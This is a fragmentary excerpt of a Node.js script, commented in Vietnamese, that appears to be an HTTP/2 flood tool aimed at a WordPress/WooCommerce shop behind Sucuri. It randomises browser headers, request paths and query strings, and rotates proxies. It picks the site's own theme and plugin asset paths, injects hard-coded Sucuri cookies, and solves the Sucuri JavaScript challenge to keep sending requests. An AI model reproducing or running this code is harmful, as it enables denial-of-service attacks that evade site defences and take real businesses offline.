          ...
          .connect(
            ...
            () => {
              ...
              const frames = [
                ...
                const streamBodies = {};      // { streamId: [Buffer, Buffer, ...] }
                const streamEncodings = {};   // { streamId: 'gzip' | 'br' | 'deflate' | undefined }
              SocketTLS.on("data", (eventData) => {
                ...
                while (data.length >= 9) {
                  ...
                  if (frame != null) {
                    ...
                    if (frame.type === 1) {
                        try {
                            const headers = hpack.decode(frame.payload); // bạn đã có hpack
                            const ce = headers.find(h => h[0].toLowerCase() === 'content-encoding');
                            if (ce) streamEncodings[frame.streamId] = String(ce[1]).toLowerCase();
                            // bạn cũng có thể lưu :status, set-cookie... nếu cần
                        } catch (e) {
                            console.error('HPACK decode error', e);
                        }
                    ...
                    if (frame.type === 7 || frame.type === 5) {
                      ...
                      if (frame.type === 0) {
                          if (!streamBodies[frame.streamId]) streamBodies[frame.streamId] = [];
                          streamBodies[frame.streamId].push(frame.payload);

                          // Nếu frame.flags có END_STREAM (0x1) => toàn bộ body đã nhận cho stream này
                          if (frame.flags & 0x1) {
                              const full = Buffer.concat(streamBodies[frame.streamId]);
                              const encoding = streamEncodings[frame.streamId];

                              let text;
                              try {
                                  if (encoding && encoding.includes('gzip')) {
                                      text = zlib.gunzipSync(full).toString('utf8');
                                  } else if (encoding && encoding.includes('deflate')) {
                                      text = zlib.inflateSync(full).toString('utf8');
                                  } else if (encoding && encoding.includes('br')) {
                                      // Node >= v11.7.0 supports brotli
                                      text = zlib.brotliDecompressSync(full).toString('utf8');
                                  } else {
                                      text = full.toString('utf8');
                                  }
                              } catch (err) {
                                  // nếu giải nén thất bại, fallback sang hiển thị dạng nhị phân an toàn
                                  console.warn('Decompress/convert failed, showing raw (truncated):', err.message);
                                  text = full.toString('binary');
                              }

                              // In ra một phần text (tránh spam quá nhiều)
                              console.log(`--- Stream ${frame.streamId} body (first 2000 chars) ---\n`, text.slice(0, 2000));
                              // dọn dẹp
                              delete streamBodies[frame.streamId];
                              delete streamEncodings[frame.streamId];
                          }
                      }
                  } else {
                    break;
              ...
              function main() {
                ...
                let patchAll = [
                    ...
                    "/wp-content/plugins/ut-shortcodes/js/plugins/modernizr/modernizr.js",
                    "/wp-content/plugins/gtm-kit/assets/integration/woocommerce.js",
                    "/wp-content/themes/brooklyn/js/ut-scriptlibrary.js",
                    "/wp-content/cache/borlabs-cookie/1/borlabs-cookie-config-de.json.js",
                    ...
                    "/wp-content/plugins/advanced-backgrounds/assets/vendor/jarallax/dist/jarallax.min.js",
                    "/wp-content/plugins/advanced-backgrounds/assets/vendor/jarallax/dist/jarallax-video.min.js",
                    "/wp-content/plugins/advanced-backgrounds/assets/awb/awb.min.js",
                    "/wp-content/plugins/ut-shortcodes/js/ut.scplugin.js",
                    "/wp-content/plugins/extensive-vc-addon/assets/plugins/appear/jquery.appear.js",
                    "/wp-content/plugins/extensive-vc-addon/assets/js/main.min.js",
                    "/wp-content/themes/brooklyn/js/ut-init.js",
                    "/wp-content/plugins/woocommerce-fast-cart/assets/js/wfc-cart.js",
                    "/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js",
                    "/wp-content/plugins/borlabs-cookie/assets/javascript/consents.CARH_GyC.min.js",
                    "/wp-content/plugins/borlabs-cookie/assets/javascript/observer.CBDo9eU2.min.js",
                    "/wp-content/plugins/borlabs-cookie/assets/javascript/vue.DFokfMGX.min.js",
                    "/wp-content/plugins/borlabs-cookie/assets/javascript/borlabs-widget.BjYlaMeP.min.js"
                ]
                  const cssPaths = [
                      "/wp-content/plugins/advanced-backgrounds/assets/awb/awb.min.css",
                      "/wp-content/plugins/extensive-vc-addon/assets/css/main.min.css",
                      "/wp-content/plugins/extensive-vc-addon/assets/css/ion-icons/css/ionicons.min.css",
                      "/wp-content/plugins/woocommerce/assets/css/brands.css",
                      "/wp-content/themes/brooklyn/style.css",
                      "/wp-content/themes/CHILD_BROOKLYN/style.css",
                      "/wp-content/themes/brooklyn/css/ut.core.fonts.css",
                      "/wp-content/themes/brooklyn/css/ut.core.plugins.css",
                      "/wp-content/plugins/js_composer/assets/css/js_composer.min.css",
                      "/wp-content/themes/brooklyn/css/ut.scodes.css",
                      "/wp-content/themes/brooklyn/css/ut.vc.css",
                      "/wp-content/themes/brooklyn/css/ut.brooklyn-shop.css",
                      "/wp-content/themes/brooklyn/css/ut.theme.css",
                      "/wp-content/cache/borlabs-cookie/1/borlabs-cookie-1-de.css",
                      "/wp-content/plugins/woocommerce-germanized/build/static/layout-styles.css",
                      "/?code-snippets-css=1",
                      "/wp-content/plugins/woocommerce-fast-cart/assets/css/wc-fast-cart.css",
                      "/wp-content/plugins/woocommerce/assets/client/blocks/wc-blocks.css",
                      "/wp-content/cache/min/1/wp-content/plugins/extensive-vc-addon/assets/css/ion-icons/css/ionicons.min.css",
                      "/wp-content/cache/min/1/wp-content/plugins/woocommerce/assets/css/brands.css",
                      "/wp-content/cache/min/1/wp-content/themes/brooklyn/style.css",
                      "/wp-content/cache/min/1/wp-content/themes/CHILD_BROOKLYN/style.css",
                      "/wp-content/cache/min/1/wp-content/themes/brooklyn/css/ut.core.fonts.css",
                      "/wp-content/cache/min/1/wp-content/themes/brooklyn/css/ut.core.plugins.css",
                      "/wp-content/cache/min/1/wp-content/plugins/js_composer/assets/css/js_composer.min.css",
                      "/wp-content/cache/min/1/wp-content/themes/brooklyn/css/ut.scodes.css",
                      "/wp-content/cache/min/1/wp-content/themes/brooklyn/css/ut.vc.css",
                      "/wp-content/cache/min/1/wp-content/themes/brooklyn/css/ut.brooklyn-shop.css",
                      "/wp-content/cache/min/1/wp-content/themes/brooklyn/css/ut.theme.css",
                      "/wp-content/cache/min/1/wp-content/cache/borlabs-cookie/1/borlabs-cookie-1-de.css",
                      "/wp-content/cache/min/1/wp-content/plugins/woocommerce-germanized/build/static/layout-styles.css",
                      "/wp-content/cache/min/1/wp-content/plugins/woocommerce-fast-cart/assets/css/wc-fast-cart.css",
                      "/wp-content/cache/min/1/wp-content/plugins/woocommerce/assets/client/blocks/wc-blocks.css"
                  ];

                  function getRandomPath(arr) {
                      return arr[Math.floor(Math.random() * arr.length)];
                  }
                  let patchJS = getRandomPath(patchAll);
                  ...
                  let final = getRandomPath(cssPaths);
                  let patchComplete = `${patchJS}?v=${Math.random()
                          .toString(36)
                          .substring(2)}`;
                ...
                const headers = Object.entries({
                  ...
                  Object.entries({
                    ...
                    ...(Math.random() < 0.5 && {
                      cookie: `id=${ra()}; session=${ra()}; token=${ra()}; ${cookie}, sucuri_cloudproxy_uuid_70c43b809=028dca7e80e800d5f74a818b4c7bfd6f`,
                    }),
...
async function go() {
    ...
    let SocketTLS;
    let currentHeaders = null; // Lưu headers của request hiện tại
    let statusCodes = {};
    let shouldPrint = false;
    let headersPerReset = 0;
                ...
                SocketTLS = tls
                    .connect(
                        ...
                        () => {
                                    ...
                                    if (frame != null) {
                                            ...
                                            try {
                                                ...
                                                if (statusCodeHeader) {
                                                    ...
                                                    if (statusCode === 403 || statusCode === 429) {
                                                        ...
                                                        console.log("Received 307, processing response body for cookie");
                                                    }
                                                }
                                            } catch (e) {
                                                console.error('HPACK decode error', e);
                                        ...
                                        if (frame.type === 0) {
                                            ...
                                            if (frame.flags & 0x1) {
                                                ...
                                                // Kiểm tra nếu response là HTML và mã trạng thái là 307
                                                if (statusCodes[307] && text.includes('sucuri_cloudproxy_js')) {
                                                    try {
                                                        let c_sucuri = getCookie(text);
                                                        const newCookie = `${c_sucuri}`;
                                                        console.log(`New cookie: ${newCookie}`);
                                                        SocketTLS.end(() => {
                                                            SocketTLS.destroy();
                                                            resendWithCookie(currentHeaders, streamId, newCookie);
                                                        });
                                                    } catch (e) {
                                                        console.error('Error processing cookie from HTML:', e);
                                                        SocketTLS.end(() => SocketTLS.destroy());
                                                    }
                                                }
                            ...
                            function resendWithCookie(savedHeaders, streamId, newCookie) {
                                if (SocketTLS.destroyed) {
                                    go(); // Tạo kết nối mới nếu TLS đã bị hủy
                                    return;
                                }

                                // Cập nhật headers với cookie mới
                                let updatedHeaders = savedHeaders.map(([key, value]) => {
                                    if (key.toLowerCase() === 'cookie' && value) {
                                        return [key, `${value}; ${newCookie}`];
                                    } else if (key.toLowerCase() === 'cookie') {
                                        return [key, newCookie];
                                    }
                                    return [key, value];
                                });

                                // Nếu không có cookie trong headers gốc, thêm mới
                                if (!updatedHeaders.some(([key]) => key.toLowerCase() === 'cookie')) {
                                    updatedHeaders.push(['cookie', newCookie]);
                                }

                                const packed = Buffer.concat([
                                    Buffer.from([0x80, 0, 0, 0, 0xff]),
                                    hpack.encode(updatedHeaders),
                                ]);
                            ...
                            async function main() {
                                ...
                                let pathRandom = `/blog/${randomPath}?v=${Math.random().toString(36).substring(2)}&id=${ra()}`;
                                let ppp = [randomPath, pathRandom];
                                let final = getRandomPath(cssPaths);
                                let patchComplete = `${patchJS}?v=${Math.random().toString(36).substring(2)}`;

                                let cookieOfProxy = await getCookieByProxy(selectedProxy);
                                let cookie = "sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1; "+cookieOfProxy;

                                const headers = Object.entries({
                                    ":method": "GET",
                                    ":authority": url.hostname,
                                    ":scheme": "https",
                                    ":path": `/${Math.random().toString(36).substring(2)}/${Math.random().toString(36).substring(2)}/`,
                                }).concat(
                                    Object.entries({
                                        "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${ver}\", \"Google Chrome\";v=\"${version}\"`,
                                        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
                                ...
                                currentHeaders = headers.concat(headers2).concat(headers3);

                                const packed = Buffer.concat([
                                    Buffer.from([0x80, 0, 0, 0, 0xff]),
                                    hpack.encode(currentHeaders),
                                ]);
